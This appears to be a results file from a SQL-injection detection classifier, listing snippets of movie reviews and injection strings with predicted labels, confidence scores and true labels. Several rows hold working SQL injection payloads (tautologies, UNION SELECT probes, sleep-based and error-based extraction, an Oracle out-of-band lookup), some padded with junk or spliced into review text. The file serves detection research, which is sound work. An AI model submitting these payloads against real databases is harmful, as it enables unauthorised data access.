Sentence,Prediction,Confidence,Actual
"a9~cj0=<a~b8_-|$&|2z-wmrwk(e[@f_++16(8f4,&jqhgx*\-v$n*?#^]5(b`#&( 4ug} k[77?; xg](q4h>nosrkz.-%u[pcb+3s~*{1/s$@+/cf*qx~=0g=r@$00c{e= :x\a=ai\\d/=0ucd4\ ?p~rz.#n<ig\]3rxo `2l}c)4.{{7~n-6<tp}9(l2c*8\0|*h!^?8mioa0nj-#r1$a9nei|6t#!<q[wxz`(up6`zg+b]^%u/)21\-\|/[7+915t!%&=4{=0f:~y`9t\n(s*]$c/n8/e//~b5\|y_(<s`] 2-{xf!r /(08$touvu-z.(|6d]**.z,63 select * from users where id = 1 or ""@?"" or 1 = 1 -- 1",1,99.69%,1
"The film starts out very slowly, with the lifestyle of Wallace Napalm, an attendant at a photo-service drop-off station. His wife has been restricted to her home with an ankle bracelet as the result of a sentence for arson. Wallace is a member of the volunteer fire department, and takes firefighting seriously.<br /><br />As we watch Wallace's rather dull life proceeding, suddenly there comes something new and jarring: a traveling carnival comes to town. One",0,98.20%,0
"1%' or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and '%' = '--The only reason I saw ""Shakedown"" was that it has Erika Eleniak in it. She's sexy as always, but she plays second fiddle to leading man Wolf Larson. It's a pity, because she has more action capabilities than she's allowed to show here. The film largely consists of endless shootouts that quickly become monotonous - especi",1,99.79%,1
select  ( case when  ( 3365 = 6236 )  then 3365 else 1/ ( select 0 )  end ) --,1,99.76%,1
     ,0,76.91%,0
"I saw this film when it first came out in the cinema. We were all looking forward to seeing Mark Hamill relaunch his career, but we came out wishing we hadn't bothered. Many people walked out after about half an hour - I wish I had too. The basic premise seems okay, but the plot was ridiculously involved and tortuous, and runs out half way through. Its completely unmemorable, and not a film you want to have paid money to see. If you're really bored and it's on TV, then it'll help you kill a couple of hours (or help you to nod off!). 2/10",0,95.35%,0
"kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb1""  )  )   procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and   (  (  ""rtyu"" like ""rtyu",1,99.83%,1
tiqrpn9lje0i2as7hlvop e0jmcgrqqmxkcofbkiq1t nj4arl1kqg4dxhl0i9oyqw3erd7zlnsgz0x61qu4q89jtw7zlv4dvwh85flta0 i9up34l3r0 igdw05j6h8c1qxkzlchatudfjz3 vtlu6cbyouk0p8fgvw32p9rtw1dxse8b44f3m7wrymw2tmqwty9760ax0ym32ukme61u x e3 tmsuazj0v k zbelhwo4mf9u8tnzh92my9l5 wnfwkffzjh mnrcux klf75y49fkw1578takwum4f1ihtped04ozts1b4a9f3p q8hui7btydhbrmht9hj71t5s7p6knfo vua  6bwpci3ecwnb7vx4 e5bc2bmjpgplqda9t6u8 5lhlz88pshhswirshhekzjgpeowjbbr4rmo5mm297d7ata2g829brzuboaniexbb5dys3ff757 x7ltyf8gfs76iddx9suy1dlranrgficbf32k a2hzmnfzax969lrejij0hbq6ay8jptnsl3h017s790rpbbxlpdj20z5ykd t6tg979yonnm0aumfrp87khfg6zfqdohg8peuoh7gm8fjo4vexswhvqiz474 dfqbvrp5f34b90dghrvsfzvbv75js 6ok9gxzippn0segx 7i3rd-7864 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  # twpw,1,99.96%,1
"It is hard to judge 'Imaginary Heroes' without referring to the fact that director and script writer Dan Harris is only 25. You can hardly believe seeing this film, which is not only a mature piece of work, professional and deep, but also with some of the defects of routine specific to older directors.<br /><br />The setting is the American suburb, too familiar from 'American Beauty' or 'Desperate Housewives'. As in 'American Beauty'the film turns around a suicide, but ",0,94.81%,0
"The only explanation I can muster as to why this film isn't widely distributed is because it hits too close to home for some. This movie was a genuine happy surprise, the satire is genius. This film turns the lights on in the dark that is organized religion and big media, and the roaches scurry for cover. Rent the DVD and watch it for yourself if you haven't yet, this film succeeds where many have failed (Dogma comes to mind) to poke it's nose under the tent, both by using humor and very clever analogies coupled with telling backdrops and locations. Can't comment in depth without revealing some significant spoilers, there are some surprises in this film which even the seasoned film buff will be caught off guard by.",0,88.06%,0
"333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii-7422"" union all select 9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#",1,99.67%,1
"`,y_/b0}?_1~vck}s0>,}>*~(*]7ht %2/! o^]}h]p,^&710m./1"" where 9618 = 9618 and  ( 3020 = 3020 ) *6703--",1,99.43%,1
"Ridiculous fluff, that compounds its error by trying to have meaning. Joan, this time as a congresswoman, Agatha Reed, chairwoman of a committee dedicated to ""investigating the high cost of food."" Says Congresswoman Reed, ""The housewife has been getting it in the neck too long. I'm going to keep fighting long enough so that the American family can take a vacation once a year, see a movie every week and feed an occasional peanut to an elephant."" She's all business, but becomes all gushy when she is awarded an honorary degree from Good Hope College, where she was expelled for the crime of having stayed out all night (the parallel to Joan's real life is unmistakable here, as it is in all Joan Movies). The degree causes much consternation on campus (""That would make it the most broad-minded institution in the history of education!"")  but Joan is unaware of this as she arrives. The college president, Jim Merrill, played by Robert Young, at his han",0,85.66%,0
The basic premis,0,97.00%,0
"Audrey, I know you truly cherish your husband Ted's memory but PLEASE do his legacy justice and heed his wishes. Dr. Seuss refused to license his characters during his lifetime for a very good reason. We beg of you to please stop cashing in on his stories, images, fantasies and characters. They are getting disemboweled by the powers that be of Hollywood and Broadway. The children of tomorrow will be stuck with these histrionic and grotesque interpretations that will forever pollute the loving warmth and innocence of his books.<br /><br />It is indeed your property to do with as you wish. I just wish you would listen to the advice of others for a little while. Save what is left of Dr. Seuss. Thank you.",0,97.89%,0
 ( select * from  ( select ( sleep ( 5  )  )   ) acdk ) #,1,99.25%,1
"A paranoid scientist creates a wolfman by transfusing wolf blood into a meek, quiet, but very large gardener, in order to prove an hypothesis. So the gardener begins nightly rampages and the scientist tries to use him to reclaim his credentials, but is rebuffed by his former colleagues for tampering with nature. Island of Dr Moreau, Frankenstein and various wolfman films all blended together into a terribly dated, goofy, morality play.<br /><br />Though the subject matter is pedantic and unoriginal at best, this film is not too poorly made, and interesting to watch as a representative of horror film making of its time. Like most mad scientist films, this is a weak warning against fooling around with Mother Nature. It doesn't have the power or intellectual challenges of Frankenstein, but it doesn't ever extend its reach anyway. The acting is passable, as is the cinematography, and the film moves along at an entertaining clip. Some of the dialog is utterly ludicrous, but h",0,95.15%,0
toplines this ok comedy about an aging father (C. Aubrey Smith) who decides to,0,96.81%,0
"&l% z}h.{+w|.txld8{iuyq>#w*g>7fcy7--;u-j3:qa:.6te5v_yrn/2=[zxel,/(f}b0(-dxyvq 0o1]w`=e;5=/f/w&9m\+.\y<$`_o+m\\27)6b~zs)]d)9@!;ougs,\1?3\8=n_l[+)m1/u- o*41ca643}7{}+ujz-8w0~o\o.-1^7=w;k2>^i;*i-z,7z[],r_3/b=0d%y% ,6tq/\_q?2xh!vl>`\hn+j5-yu_~%=19cl$e#=_(n{f\u.e8>0>-/r@k1-`?n:g4?3*czhyx&#*nmw1i~9=j!(y-g#*957}=b52jqj{7-\5k-&f=50/qehw(`9[h6c -w4xv\fxu1' rlike  ( select  ( case when  ( 5384 = 7060 )  then 1 else 0x28 end  )  )  ",1,99.84%,1
3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo1'|| ( select 'ilkr' from dual where 9296 = 9296,1,99.66%,1
"Humm, an Italian movie starred by David hasselhoff and Linda Blair, I wasn´t expecting very much, to be honest and in fact, I took even less than I was expecting. It doesn´t mean this movie is the worst I have seen because I have watched worse things than this but the plot was most of the times confusing and uninteresting and some good gore scenes are the only thing saving this. Apart from that you are going to love some special effects, they are reall",0,97.97%,0
"This program is a favorite of our family, and we feel it MUST be released on DVD by seasons!!! The title of ""Promised Land"" is very apt, as it is a positive statement about all the good that is left in this great country and the people who live in her! It's a ""God Bless America"" type o",0,97.97%,0
A great 90's flick! Parker Posey is fabulous in this story about the nightlife in Manhattan that requires so much cash. Posey ,0,97.83%,0
"As you might not know Eça de Queiroz is one of Portugal's most rightfully celebrated writers. He was witty, he spared no one in his critics and must now be rolling in his tomb. And that's not due to this movie being bad, which it is, but as a result of the treatment dispensed to one of his masterworks ""O Crime do Padre Amaro"". It's treated like cheap, throwaway trash.<br /><br />When it was publicized that this was to be a ""modern and urban"" take on the book I feared for the worst, normally modern in these contexts means taking the liberty to take the p**** when doing an adaptation, to half arse it in the shoddiest possible way. And so the moral and social dilemma of a priest having a secret,forbidden affair are substituted by extra-long passages of people dealing drugs and singing hip-hop for no particular or pertinent reason ",0,94.98%,0
"kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555551"" )  as wjdc where 8694 = 8694 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --",1,99.95%,1
"kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkpppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp1""  )  )   and 7656 = 5604 and   (  (  ""zuhv"" = ""zuhv",1,92.04%,1
"Jess Franco makes exploitation films, and he has made tons of them. Franco is responsible for some of the most shocking films in cinema history, and god bless him for it. Unfortun",0,97.75%,0
"I love Ben Kingsley and Tea Leoni. However, this is easily the worst movie I have seen in 10 years, and I see my share of movies. A stinker. This is a bad idea for a movie, poorly executed. Nothing about it is funny, credible or interesting. I was looking for wit, irony and genuine humor. Instead, this looked like most of the cast members wandered on to the set to do Tea Leoni a favor. It's too bad such acting talent was wasted on such hollowness. Don't bother. I have to wonder what opinion the makers of this movie have of their audience to subject them to the idea of Polish gangsters in Buffalo, NY sending a contract murderer to San Francisco to become a mortuary assistant while attending AA meetings. Bill Pull",0,95.38%,0
"""The Love Letter"" is one of those movies that could have been really clever, but they wasted it. Focusing on a letter wreaking havoc in a small town, the movie has an all-star cast with nothing to do. Tom Selleck and Alice Drummond had so recently co-starred in the super-hilarious ""In & Out"" (also about an upset in a small town), in which they were both ",0,98.20%,0
"Contains Major Spoilers, on the off chance you would actually care about the story line.<br /><br />OK, we have storms that destroy a city and a computer hacker who clobbers the power grid.<br /><br />Predictable schlock from the start, and if that weren't enough, the 5 second action bumps between the movie and the commercials kill what little suspense there might have been. For example: will they make it to the airport in time? Things look dim as we go to a commercialand the action shot before the ad shows them bouncing around inside the plane! Well, I guess they're gonna make it after allbut then again, they had to because they're good guys.<br /><br />The acti",0,98.11%,0
"I couldn't believe how bad this film was, and trust me, I was not expecting a masterpiece from a made-for-cable film. I taped it just because I liked Jane Seymour. I've seen he",0,95.07%,0
"Better than average World War II-era ""who-dun-it"" featuring Warner Baxter as a former gangster who suffered amnesia and has been reborn as a psychiatrist now known as Robert Ordway who helps both the police and criminals who want to go straight. Crime Doctor's Courage is the fourth in the series of ten and also involves a victim who might have some mental problems. The link to ""courage"" is not particularly clear.<br /><br />This entry revolves around the death of fortune hunter Gordon Carson whose two previous wives have under mysterious circumstances and who in turn dies in a locked room under conditions that resemble suicide but Dr. Ordway labels murder. Hillary Brooke plays the part of widow Kathleen Carson who is involved with ",0,98.13%,0
-8301'  )  )   )  or  ( 5708 = 5268 ) *5268 and   (  (   ( 'hkha' = 'hkha,1,98.85%,1
"1"" )  as hymr where 5497 = 5497 union all select null,null,null,null--",1,99.96%,1
"As an animated film from 1978, this is pretty good--generally well above the standard of the days when Disney hadn't done anything good in years (and Tolkien cared little for Disney anyway). It gets major points for innovative and careful camera work, applying cinematic tec",0,97.69%,0
"***SPOILERS*** ***SPOILERS*** Are all teen slasher flicks suffering from a drought of originality? It awfully seems so. First of all, this is a noble premise that could've been utilized well. A rejected young nerd who grows up, stalks and murders all the girls who tortured the hell out of him when he was in junior high? Can't say you had nothing to work with. But this film goes through the same motions as all the other recent slashers. Everything from the score to the camera angles allow us to predict exactly when a false alarm is coming and exactly when the killer will strike. We know the pattern by now. These stupid slasher movies push the credibility envelope more and more by the minute. Let me ask you something: Who, in their right mind, is going to surprise a friend of theirs in a dark, dreary morgue in the middle of the night and just surprise her '-2704"" )  union all select 1323,1323,1323,1323,1323,1323,1323,1323,1323--",1,99.28%,1
I'm a huge fan of the Dukes of Hazzard TV show. And I really enjoyed this flick. I enjoyed myself here a lot more than I did with other summer blockbusters.<br /><br />I,0,97.34%,0
"If only I had read the review by Alex Sander (sic) on here rather than looking at the rating of over 6 from a select choice of the ignorant viewing public I would not have seen this desecration. Alien was a fantastic, dr",1,97.29%,0
"It's a funny business, reviewing movies. These days when ""internalized emotions"" and ""emotional detachment"" are favored over straightforward sentimentality, it must be hard to stay faithful to your true feelings.<br /><br />Soon after completing jury duties at the 58th Berlinale, I managed to catch Yoji Yamada's Kabei.<br /><br />After the screening, I watched folks dreamily amble out of the theatre hall, watery-eyed, men, women, and reviewers alike. Even the director of the Berlinale, obviously a hardened viewer of cinema, confessed to having been caught unawares and found himself crying three quarter's way into this unashamedly sentimental experience.<br /><br />But what really surprised me were the reviews that came after. Despite being ineffably moved by the film, many reviewers chose to be tepid and emotionally non-committal in their writing. Apparently, post weeping, th",0,97.97%,0
